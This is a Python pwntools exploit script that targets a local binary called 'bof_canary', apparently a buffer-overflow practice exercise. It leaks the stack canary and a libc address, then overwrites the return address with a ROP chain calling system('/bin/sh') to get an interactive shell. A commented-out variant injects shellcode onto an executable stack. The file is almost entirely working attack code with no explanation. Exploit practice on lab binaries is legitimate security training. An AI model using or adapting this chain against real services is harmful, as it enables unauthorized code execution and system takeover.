from pwn import *

with open("shellcode", "rb") as f:
    shellcode = f.read()

#r = process("./bof_canary_execstack")
r = process("./bof_canary")

msg = b"a"*0x39
r.sendline(str(len(msg)))
r.send(msg)
r.recvn(len(msg))
canary = r.recvn(7)
canary = b"\x00" + canary
info("canary: 0x{:016x}".format(u64(canary)))
r.clean()

'''
rop
'''
msg = b"a"*0x48
r.sendline(str(len(msg)))
r.send(msg)
r.recvn(len(msg))
libc = u64(r.recvn(6) + b"\x00\x00") # 0x7ffff7e1c1a3 __libc_start_main+243

#libc -= 0x21b97
libc -= 0x271A3
#libc = 0x00007ffff7df5000 # hardcoded

info("libc: 0x{:016x}".format(libc))
r.clean()

POP_RDI = 0x26b62#0x000000000002155f # 0x0000000000026b62 # pop rdi ; ret
SYSTEM = 0x499E0#0x4f440
BIN_SH = 0x18d1ac
RET = POP_RDI + 1

msg = b"a"*0x38
msg += canary
msg += p64(0)

msg += p64(libc + RET)
msg += p64(libc + POP_RDI)
msg += p64(libc + BIN_SH)
msg += p64(libc + SYSTEM)

#gdb.attach(r)

'''
exec stack

msg = b"a"*0x58
r.sendline(str(len(msg)))
r.send(msg)
r.recvn(len(msg))
stack = u64(r.recvn(6) + b"\x00\x00")
stack -= 0x128
info("stack: 0x{:016x}".format(stack))
r.clean()

msg = shellcode
msg = msg.ljust(0x38, b"a")
msg += canary
msg += p64(0)
msg += p64(stack)
'''

r.sendline(str(len(msg)))
r.send(msg)

r.sendline(b"0")

r.interactive()
